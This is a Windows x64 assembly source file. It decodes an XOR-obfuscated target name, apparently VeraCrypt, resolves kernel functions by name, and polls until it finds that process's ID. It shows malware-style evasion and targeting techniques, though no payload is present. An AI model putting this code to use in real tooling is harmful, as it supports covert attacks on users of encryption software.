section .text
global WinMain

%include '..\utils_64_text.asm'

WinMain:
    push rbp
    mov rbp, rsp

    ; [rbp - 8] = return value
    ; [rbp - 16] = kernel mod handle
    ; [rbp - 24] = proc id
    ; 8 bytes padding

    sub rsp, 32                     ; allocate local variable space

    sub rsp, 32
    mov rcx, veracrypt_xor
    mov rdx, veracrypt_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor
    add rsp, 32

    sub rsp, 32
    call get_kernel_module_handle
    add rsp, 32

    mov [rbp - 16], rax             ; kernel mod handle

    sub rsp, 32
    mov rcx, [rbp - 16]             ; kernel mod handle
    call populate_kernel_function_ptrs_by_name
    add rsp, 32

.loop:
    sub rsp, 32
    mov rcx, veracrypt_xor
    mov rdx, veracrypt_xor.len
    call find_target_process_id     ; proc id
    add rsp, 32

    cmp rax, 0
    jne .loop_end
    
    sub rsp, 32
    mov rcx, 5000
    call [sleep_addr]
    add rsp, 32

    jmp .loop

.loop_end:
    mov [rbp - 24], rax             ; proc id

.shutdown:
    add rsp, 32                     ; free local variable space

    leave
    ret

section .data
veracrypt_xor: db 0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0
.len equ $ - veracrypt_xor - 1

%include '..\utils_64_data.asm'